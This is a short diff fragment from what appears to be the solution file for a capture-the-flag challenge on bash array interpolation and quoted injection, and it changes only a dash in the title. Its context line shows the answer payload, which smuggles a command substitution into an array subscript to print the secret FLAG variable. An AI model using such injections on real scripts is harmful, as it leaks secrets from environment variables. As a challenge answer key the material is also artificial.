@@ -1,4 +1,4 @@
-# SOLUTION — Challenge 05 : Array Interpolation / Quoted Injection
+# SOLUTION - Challenge 05 : Array Interpolation / Quoted Injection
 
 ```
 ./runner 'a[$(echo $FLAG >&2)]'
